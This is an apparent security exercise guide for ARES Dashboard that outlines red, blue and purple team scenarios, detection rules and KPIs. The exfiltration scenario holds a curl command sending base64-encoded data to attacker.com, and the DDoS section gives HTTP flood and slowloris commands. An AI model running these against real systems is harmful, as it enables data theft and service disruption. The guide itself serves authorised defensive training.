# Red Team & Blue Team Exercise Guide

## Overview

This guide provides comprehensive procedures for conducting Red Team (offensive) and Blue Team (defensive) security exercises for ARES Dashboard.

## Exercise Types

### 1. Red Team Exercises

**Objective:** Simulate real-world attacks to test security controls

**Duration:** 1-4 weeks

**Team Size:** 2-5 red team members

### 2. Blue Team Exercises

**Objective:** Detect, respond to, and mitigate security threats

**Duration:** Continuous monitoring + incident response drills

**Team Size:** 3-10 blue team members

### 3. Purple Team Exercises

**Objective:** Collaborative improvement between red and blue teams

**Duration:** 1-2 days per scenario

**Team Size:** Combined red and blue team

## Red Team Exercise Scenarios

### Scenario 1: External Attacker - Initial Access

**Goal:** Gain initial access to ARES Dashboard

**Attack Vectors:**

1. **Phishing Campaign**
   ```
   Target: Developers or admins with GitHub access
   Method: Spear-phishing email with malicious link
   Payload: Credential harvester or malware
   ```

2. **Exposed Credentials**
   ```bash
   # Search for exposed credentials
   # GitHub
   trufflehog git https://github.com/Arnoldlarry15/ARES-Dashboard
   
   # Public paste sites
   python3 pasted.py ares-dashboard
   
   # Shodan/Censys for exposed services
   shodan search ares-dashboard
   ```

3. **Supply Chain Attack**
   ```bash
   # Identify dependencies
   npm audit
   
   # Check for typosquatting opportunities
   # Look for vulnerable packages
   ```

**Success Criteria:**
- [ ] Obtain valid credentials
- [ ] Access internal systems
- [ ] Establish persistence

**Timeline:**
- Day 1-3: Reconnaissance
- Day 4-7: Initial access attempts
- Day 8-14: Establish foothold

### Scenario 2: Insider Threat - Privilege Escalation

**Goal:** Escalate from analyst to admin privileges

**Attack Path:**

1. **Reconnaissance**
   ```bash
   # Map application structure
   # Identify API endpoints
   # Document role-based access controls
   ```

2. **Privilege Escalation Attempts**
   - Exploit IDOR vulnerabilities
   - JWT token manipulation
   - Parameter tampering
   - Business logic flaws

3. **Lateral Movement**
   - Access other users' campaigns
   - Modify audit logs
   - Access database directly

**Success Criteria:**
- [ ] Escalate to admin role
- [ ] Access all campaigns
- [ ] Modify system configuration
- [ ] Cover tracks in audit logs

**Timeline:**
- Day 1-2: Reconnaissance
- Day 3-5: Exploitation attempts
- Day 6-7: Lateral movement and persistence

### Scenario 3: Data Exfiltration

**Goal:** Extract sensitive campaign data and user information

**Attack Path:**

1. **Identify Valuable Data**
   ```
   - Campaign definitions
   - Attack vectors and payloads
   - User credentials
   - API keys
   - Audit logs
   ```

2. **Exfiltration Methods**
   ```bash
   # DNS exfiltration
   curl "http://attacker.com/$(base64 sensitive_data.json)"
   
   # Steganography
   steghide embed -cf image.png -ef sensitive_data.json
   
   # Slow exfiltration
   # Small requests over time to avoid detection
   ```

3. **Anti-Forensics**
   - Clear logs
   - Use encrypted channels
   - Blend with normal traffic

**Success Criteria:**
- [ ] Exfiltrate >1000 campaigns
- [ ] Obtain user database
- [ ] Remain undetected for >72 hours

**Timeline:**
- Day 1-3: Identify and prioritize data
- Day 4-10: Exfiltration
- Day 11-14: Cover tracks

### Scenario 4: Ransomware Simulation

**Goal:** Simulate ransomware attack (without actual encryption)

**Attack Path:**

1. **Initial Access**
   - Phishing
   - Exposed RDP/SSH
   - Vulnerable web application

2. **Privilege Escalation**
   - Kernel exploits
   - Service misconfigurations

3. **Lateral Movement**
   - Network scanning
   - Credential dumping
   - SMB enumeration

4. **Impact Simulation**
   ```bash
   # Identify critical files (DO NOT ENCRYPT)
   find /data -type f -name "*.db"
   
   # Test backup accessibility
   # Document recovery time objective (RTO)
   ```

**Success Criteria:**
- [ ] Map all critical systems
- [ ] Identify backup systems
- [ ] Demonstrate impact potential
- [ ] Document recovery procedures

**Timeline:**
- Day 1-5: Lateral movement
- Day 6-10: Mapping critical systems
- Day 11-14: Impact simulation

## Blue Team Exercise Scenarios

### Scenario 1: Detect and Respond to Web Application Attack

**Objective:** Detect and mitigate SQL injection and XSS attacks

**Setup:**

1. **Monitoring Configuration**
   ```yaml
   # Configure alerts
   - Alert on SQL keywords in logs
   - Alert on suspicious user agents
   - Alert on abnormal request patterns
   - Alert on failed authentication attempts
   ```

2. **Detection Rules**
   ```yaml
   # WAF rules (example: ModSecurity)
   SecRule REQUEST_URI "@rx (?:union|select|insert|update|delete|drop)" \
     "id:1001,phase:2,block,msg:'SQL Injection Attempt'"
   
   SecRule REQUEST_URI "@rx (?:<script|javascript:|onerror=|onload=)" \
     "id:1002,phase:2,block,msg:'XSS Attempt'"
   ```

**Exercise Steps:**

1. **Detection**
   ```bash
   # Red team sends malicious payloads
   # Blue team monitors for alerts
   # Time to detect: Target <5 minutes
   ```

2. **Analysis**
   ```bash
   # Investigate logs
   tail -f /var/log/ares/access.log | grep "union\|select"
   
   # Check Prometheus metrics
   curl http://localhost:3000/api/metrics | grep http_requests_errors
   
   # Query SIEM
   SELECT * FROM logs WHERE message LIKE '%SQL%' AND level = 'error'
   ```

3. **Response**
   ```bash
   # Block attacker IP
   iptables -A INPUT -s 192.168.1.100 -j DROP
   
   # Update WAF rules
   # Rotate affected credentials
   ```

4. **Recovery**
   ```bash
   # Verify no data was compromised
   # Check database integrity
   # Review and patch vulnerability
   ```

**Success Metrics:**
- [ ] Time to detect: <5 minutes
- [ ] Time to respond: <15 minutes
- [ ] Time to recover: <30 minutes
- [ ] False positive rate: <5%

### Scenario 2: Insider Threat Detection

**Objective:** Detect unusual behavior from authenticated user

**Anomaly Indicators:**

1. **Access Patterns**
   - Login at unusual hours
   - Access from unusual locations
   - Bulk data downloads
   - Privilege escalation attempts

2. **Detection Rules**
   ```python
   # Python pseudocode for anomaly detection
   def detect_insider_threat(user_activity):
       # Check for bulk downloads
       if user_activity.downloads_per_hour > 100:
           alert("Potential data exfiltration")
       
       # Check for unusual access times
       if user_activity.login_time not in normal_hours:
           alert("Unusual login time")
       
       # Check for privilege escalation
       if user_activity.role_change_attempts > 0:
           alert("Privilege escalation attempt")
   ```

**Exercise Steps:**

1. **Baseline Establishment**
   ```sql
   -- Analyze normal behavior patterns
   SELECT 
     user_id,
     AVG(requests_per_hour) as avg_requests,
     STDDEV(requests_per_hour) as std_requests
   FROM user_activity
   GROUP BY user_id;
   ```

2. **Anomaly Detection**
   ```sql
   -- Detect anomalies (>3 standard deviations)
   SELECT 
     user_id,
     requests_per_hour
   FROM user_activity
   WHERE requests_per_hour > (avg_requests + 3 * std_requests);
   ```

3. **Investigation**
   ```bash
   # Review user's actions
   SELECT * FROM audit_logs WHERE actor_id = 'suspect_user_id' ORDER BY timestamp DESC;
   
   # Check campaign access patterns
   SELECT campaign_id, COUNT(*) as access_count
   FROM audit_logs
   WHERE actor_id = 'suspect_user_id' AND action = 'campaign_view'
   GROUP BY campaign_id
   HAVING access_count > 10;
   ```

4. **Response**
   - Suspend account
   - Revoke access tokens
   - Notify management
   - Preserve evidence

**Success Metrics:**
- [ ] Detection accuracy: >90%
- [ ] Time to detect: <30 minutes
- [ ] Time to investigate: <2 hours
- [ ] Time to respond: <4 hours

### Scenario 3: DDoS Attack Mitigation

**Objective:** Detect and mitigate denial of service attacks

**Attack Types:**

1. **HTTP Flood**
   ```bash
   # Simulate attack (DO NOT use against production)
   ab -n 100000 -c 1000 https://staging.ares-dashboard.example.com/
   ```

2. **Slowloris**
   ```bash
   # Slow HTTP attack
   slowhttptest -c 1000 -H -g -o slowloris.html \
     -i 10 -r 200 -t GET -u https://staging.ares-dashboard.example.com/
   ```

**Defense Measures:**

1. **Rate Limiting**
   ```nginx
   # Nginx rate limiting
   limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
   
   location /api/ {
     limit_req zone=api burst=20 nodelay;
   }
   ```

2. **Connection Limiting**
   ```nginx
   # Limit connections per IP
   limit_conn_zone $binary_remote_addr zone=addr:10m;
   
   server {
     limit_conn addr 10;
   }
   ```

3. **WAF Rules**
   ```yaml
   # ModSecurity rules
   SecRule REQUEST_RATE "@gt 100" \
     "id:2001,phase:1,deny,status:429,msg:'Rate limit exceeded'"
   ```

**Exercise Steps:**

1. **Detection**
   - Monitor request rates
   - Track error rates
   - Check server resources

2. **Analysis**
   ```bash
   # Analyze traffic patterns
   tcpdump -i any -n -c 1000 port 443 > traffic.pcap
   
   # Check request distribution
   cat access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head -20
   ```

3. **Mitigation**
   ```bash
   # Enable rate limiting
   # Block attacking IPs
   # Enable CDN DDoS protection
   # Scale infrastructure
   ```

**Success Metrics:**
- [ ] Service availability: >99%
- [ ] Response time impact: <20%
- [ ] Time to mitigate: <10 minutes
- [ ] Attack traffic blocked: >95%

## Purple Team Collaboration

### Exercise Format

1. **Planning Phase**
   - Define objectives
   - Select scenario
   - Set rules of engagement
   - Assign roles

2. **Execution Phase**
   - Red team attacks
   - Blue team defends
   - Real-time communication
   - Document actions

3. **Review Phase**
   - Discuss tactics
   - Review detections
   - Identify gaps
   - Document lessons learned

### Example Purple Team Exercise

**Scenario:** API Authentication Bypass

**Red Team Actions:**
```bash
# 1. Attempt JWT token manipulation
# 2. Try SQL injection in login
# 3. Test for authentication bypass
# 4. Exploit rate limiting bypass
```

**Blue Team Actions:**
```bash
# 1. Monitor authentication logs
# 2. Check WAF alerts
# 3. Review API request patterns
# 4. Investigate anomalies
```

**Collaboration Points:**
- Red team explains attack technique
- Blue team demonstrates detection
- Both teams discuss improvements
- Document findings and recommendations

## Metrics and KPIs

### Red Team Metrics

| Metric | Target | Actual |
|--------|--------|--------|
| Time to initial access | <72 hours | |
| Systems compromised | >3 | |
| Data exfiltrated | >1GB | |
| Time undetected | >48 hours | |
| Privilege escalations | >1 | |

### Blue Team Metrics

| Metric | Target | Actual |
|--------|--------|--------|
| Mean time to detect (MTTD) | <30 min | |
| Mean time to respond (MTTR) | <1 hour | |
| Mean time to recover (MTTR) | <4 hours | |
| Detection accuracy | >90% | |
| False positive rate | <10% | |

### Purple Team Metrics

| Metric | Target | Actual |
|--------|--------|--------|
| Tactics identified | >10 | |
| Detections improved | >5 | |
| Gaps discovered | Document all | |
| Action items created | >20 | |
| Team satisfaction | >8/10 | |

## Post-Exercise Activities

### 1. Debrief

**Agenda:**
- Review objectives
- Discuss key findings
- Highlight successes
- Identify improvements

**Questions:**
- What worked well?
- What didn't work?
- What surprised us?
- What should we change?

### 2. Report

**Sections:**
1. Executive Summary
2. Exercise Scope and Methodology
3. Red Team Findings
4. Blue Team Response
5. Gaps Identified
6. Recommendations
7. Action Items

### 3. Remediation

**Priority Matrix:**

| Priority | Action | Owner | Deadline |
|----------|--------|-------|----------|
| Critical | Patch SQLi vulnerability | Dev Team | 7 days |
| High | Improve logging | SecOps | 14 days |
| Medium | Update WAF rules | Security | 30 days |
| Low | Document procedures | All | 60 days |

### 4. Continuous Improvement

**Follow-up:**
- Schedule retest
- Update security controls
- Train team members
- Refine detection rules
- Update runbooks

## Tools and Resources

### Red Team Tools

- **Metasploit** - Exploitation framework
- **Cobalt Strike** - Command and control
- **Burp Suite** - Web application testing
- **BloodHound** - Active Directory analysis
- **Mimikatz** - Credential extraction

### Blue Team Tools

- **Splunk/ELK** - SIEM
- **Suricata/Snort** - IDS/IPS
- **OSSEC** - Host-based IDS
- **Wazuh** - Security monitoring
- **TheHive** - Incident response platform

### Purple Team Tools

- **VECTR** - Purple team management
- **Caldera** - Automated adversary emulation
- **Atomic Red Team** - Attack simulation
- **Detection Lab** - Training environment

## Legal and Compliance

### Authorization

- ✅ Get written authorization
- ✅ Define scope clearly
- ✅ Set rules of engagement
- ✅ Establish communication channels

### Rules of Engagement

**Allowed:**
- Staging environment testing
- Authorized production testing (off-hours)
- Social engineering (pre-approved)
- Network scanning (defined scope)

**Prohibited:**
- Physical attacks
- Actual data destruction
- Real ransomware
- Attacks on third-party services
- Production testing without approval

### Data Handling

- ✅ Secure all exercise data
- ✅ Encrypt sensitive findings
- ✅ Limit access to reports
- ✅ Destroy data after exercise

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Red Team Infrastructure Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)
- [Blue Team Handbook](https://www.amazon.com/Blue-Team-Handbook-Condensed-Operations/dp/1726273989)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
